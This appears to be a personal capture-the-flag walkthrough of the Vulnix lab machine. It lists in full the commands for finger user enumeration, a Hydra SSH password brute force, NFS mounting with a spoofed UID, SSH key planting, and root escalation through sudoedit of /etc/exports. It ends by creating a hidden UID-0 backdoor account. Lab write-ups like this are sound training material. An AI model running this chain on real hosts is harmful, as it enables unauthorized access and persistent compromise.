@@ -1,0 +1,218 @@
+
+IP - 10.0.2.9
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found ssh user from finger port 79
+
+┌──(root㉿kali)-[~]
+└─# finger user@10.0.2.9
+Login: user                             Name: user
+Directory: /home/user                   Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovenull                         Name: Dovecot login user
+Directory: /nonexistent                 Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[~]
+└─# hydra -l user -P /usr/share/wordlists/fasttrack.txt 10.0.2.9 ssh                                                                                                                 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-16 04:19:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking ssh://10.0.2.9:22/
+[STATUS] 116.00 tries/min, 116 tries in 00:01h, 112 to do in 00:01h, 10 active
+[STATUS] 83.00 tries/min, 166 tries in 00:02h, 62 to do in 00:01h, 10 active
+[22][ssh] host: 10.0.2.9   login: user   password: letmein
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-16 04:22:18
+
+
+I got ssh "user" credential and login to ssh but there is nothing I can with binary exploitation but I found another user "vulnix" and it's UID 2008 so I decided to enumerate another port.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+I found port 2049/tcp nfs_acl
+
+So, I research about that port number enumeration and found this article.
+
+https://vk9-sec.com/2049-tcp-nfs-enumeration/
+
+Step - 1
+
+Enumeration
+Showmount
+
+1. To enumerate shares on the network you can use showmount command
+
+showmount -e 10.0.2.10 
+
+Step - 2
+
+Mount the share
+
+mkdir /tmp/nfs
+
+Knowing the partition location (/home/vulnix) mount it to the new directory /tmp/nfs,
+
+mount -t nfs 10.0.2.10:/home/vulnix /tmp/nfs -nolock
+
+I use it's UID 2008 previously I found from "user" ssh.
+
+useradd -u 2008 -m -d /home/vulnix vulnix
+
+Then swith user to vulnix and access the folder.
+
+su vulnix
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+After we mounted nfs /home/vulnix as /tmp/nfs, we can generate ssh key for vulnix.
+
+1. ┌──(vulnix㉿kali)-[/tmp/nfs]
+└─$ ssh-keygen -t ssh-rsa
+Generating public/private ssh-rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): 
+/home/vulnix/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/vulnix/.ssh/id_rsa
+Your public key has been saved in /home/vulnix/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:jmrWo/MdhwoQYZoI6tRGhra07RW2ZGNFY1NTvdgavk4 vulnix@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|. +o  o*.o...    |
+|+B+. B. o .  .   |
+|B.=o= +     o .  |
+|oo.o o     o o   |
+| .o .   S . o    |
+|   o   o . o     |
+|    ... + .E.    |
+|    +ooo o..     |
+|   oo+o.. ..     |
++----[SHA256]-----+
+
+
+Copy public key into mounted location but need to create .ssh folder first.
+
+2. ┌──(vulnix㉿kali)-[/tmp/nfs]
+└─$ cp /home/vulnix/.ssh/id_rsa.pub .ssh/authorized_keys
+
+
+Connect ssh with old public key accept type cause this machine is very old now.
+
+3. ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  vulnix@10.0.2.10
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+I run sudo -l as vulnix user and found:
+
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+
+(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports (We can edit /etc/exports as root)
+
+
+So, I added /root directory into /etc/exports with no_root_squach End Of The Line.
+
+***After Adding /root   *(rw,no_root_squash) Need to restart the machine to work***
+
+Meaning, we can also mount root directory as /home/vulnix. 
+
+
+showmount -e 10.0.2.10
+Export list for 10.0.2.10:
+/root        *
+/home/vulnix *
+
+
+
+mkdir /tmp/vulnix_root
+
+mount -t nfs 10.0.2.10:/root /tmp/vulnix_root -nolock
+
+generate ssh key as before
+
+1. ssh-keygen -t ssh-rsa
+
+2. cp /root/.ssh/id_rsa.pub ./authorized_keys
+
+3. ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  root@10.0.2.10
+
+
+┌──(root㉿kali)-[~/.ssh]
+└─# ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  root@10.0.2.10
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Mon Jan 16 11:13:31 GMT 2023
+
+  System load:  0.0              Processes:           91
+  Usage of /:   90.2% of 773MB   Users logged in:     1
+  Memory usage: 4%               IP address for eth0: 10.0.2.10
+  Swap usage:   0%
+
+  => / is using 90.2% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+Your Ubuntu release is not supported anymore.
+For upgrade information, please visit:
+http://www.ubuntu.com/releaseendoflife
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+root@vulnix:~# whoami
+root
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Got trophy
+
+root@vulnix:~# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
+
+
+
+
